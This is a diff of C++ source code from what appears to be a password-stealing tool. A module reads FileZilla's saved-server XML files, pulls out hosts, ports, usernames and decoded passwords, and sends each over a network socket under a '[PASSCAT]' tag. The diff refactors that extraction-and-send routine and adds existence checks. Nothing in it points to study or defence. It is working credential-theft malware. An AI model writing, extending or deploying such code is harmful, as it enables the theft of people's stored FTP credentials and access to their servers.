@@ -28,16 +28,25 @@
 
 static void _print_passwords(std::wstring filename, std::wstring XPATH) {
 
-	std::wstringstream out;
+	std::wstringstream out(std::ios_base::app | std::ios_base::out);
 	MSXML::IXMLDOMNodeListPtr list = libxml::select_by_path(filename, XPATH);
-
+	
 	for (long i = 0; i != list->length; ++i) {
+		
+		
+		if (list->item[i]->selectSingleNode("Port")) {
+			out << "\n[PASSCAT]\nHost: " << list->item[i]->selectSingleNode("Host")->text;
+		}
+		
+		if (list->item[i]->selectSingleNode("Port")) {
+			out << "\n[PASSCAT]\nPort: " << list->item[i]->selectSingleNode("Port")->text;
+		}
+		
+		if (list->item[i]->selectSingleNode("User")) {
+			out << "\n[PASSCAT]\nUsername: " << list->item[i]->selectSingleNode("User")->text;
+		}
 
-		out << "\n[PASSCAT]\nHost: " << list->item[i]->selectSingleNode("Host")->text ;
-		out << "\n[PASSCAT]\nPort: " << list->item[i]->selectSingleNode("Port")->text ;
-		out << "\n[PASSCAT]\nUsername: " << list->item[i]->selectSingleNode("User")->text ;
-
-		std::wstring ws(out.str().c_str());
+		std::wstring ws(out.str());
 		std::string stws(ws.begin(), ws.end());
 
 		sockSend(stws.c_str());
@@ -65,11 +74,17 @@ static void _print_passwords(std::wstring filename, std::wstring XPATH) {
 			HeapFree(GetProcessHeap(), 0, decoded);
 			continue;
 		}
+		
+		sockprintf("\n[PASSCAT]\nPassword: %s\n", decoded);
+
+		HeapFree(GetProcessHeap(), 0, decoded);
+		
+		ws.clear();
+
 
 		//out << "\n[PASSCAT]\nPassword: " << decoded ;
-		sockprintf("\n[PASSCAT]\nPassword: %s\n", decoded);
 		
-		HeapFree(GetProcessHeap(), 0, decoded);
+		
 	}
 }
 
@@ -78,15 +93,23 @@ void libfilezilla::print_filezilla_passwords(void) {
 	std::wstring recent_servers = path + L"\\" + FILEZILLA_FILE_ONE;
 	std::wstring site_manager = path + L"\\" + FILEZILLA_FILE_TWO;
 
+	//MessageBoxW(NULL, path.c_str(), NULL, 0);
 	if (!PathFileExistsW(recent_servers.c_str())) {
 		return;
 	}
+	else {
+	
+		_print_passwords(recent_servers, FILEZILLA_XPATH_ONE);
+	}
 
-	_print_passwords(recent_servers, FILEZILLA_XPATH_ONE);
+	
 
 	if (!PathFileExistsW(site_manager.c_str())) {
 		return;
 	}
-
-	_print_passwords(site_manager, FILEZILLA_XPATH_TWO);
+	else {
+		
+		_print_passwords(site_manager, FILEZILLA_XPATH_TWO);
+	}
+	
 }
